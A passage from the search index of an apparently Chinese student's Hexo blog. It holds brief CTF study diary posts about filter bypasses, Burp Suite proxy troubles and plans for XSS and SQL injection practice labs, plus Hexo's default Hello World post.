ls的payload会被过滤；两篇最后字符串拼接的方法相同但第一篇作者说会被屏蔽，自己试时同第二篇可以绕过，单纯因为ag在前在后？<br>（这种怎么也是1分啊）</p><h4 id="水"><a href="#水" class="headerlink" title="水"></a>水</h4><p>周五时用chrome接bp代理结果没法用一直超时，不知道是证书还是啥原因挺麻的早知道就重新安装了</p><p>补:折腾到现在，大概是Proxy SwitchyOmega这个插件的问题，直接改本地服务器代理就行（真是浪费人生，好像我经常把时间花在一些弱智的问题上）然后旧版的hackbar好像是用不了的（就是那个改付费要破解的），火狐跟谷歌都一样，无法load url也不能发送，百度无果，不知道啥情况<br>解决这些问题还是偶然发现学长给的bp压缩包里有附带的说明书，近在眼前的答案没发现…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>水</title>
    <link href="/2023/03/17/water/"/>
    <url>/2023/03/17/water/</url>
    
    <content type="html"><![CDATA[<p>之前的博客懒得搬了（）：<a href="http://www.yuque.com/mytte">http://www.yuque.com/mytte</a></p><p>好像自开学以来一直摸鱼没干啥事，想要在周末强迫自己干点事难度挺大<br>感觉落后了进度不少，在之前新生赛的尝试中发现对于xss和sql的掌握并<br>不咋样，而且脑子太公式化了</p><p>上周重试了xss-lab，但是这个练习好像更集中于绕过，对于自己不熟悉的<br>外带以及注入点发现啥的帮助似乎不大</p><p>周末再试下sql-lab，不然还是不太懂实操上要注入啥</p><p>前几天在那个之前的比赛群里看到了个招聘公告，想起来还有代码审计的书<br>被落下了</p><p>emm在BUUctf找些简单的试下再去试群里的题，就先这样了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/01/17/hello-world/"/>
    <url>/2023/01/17/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
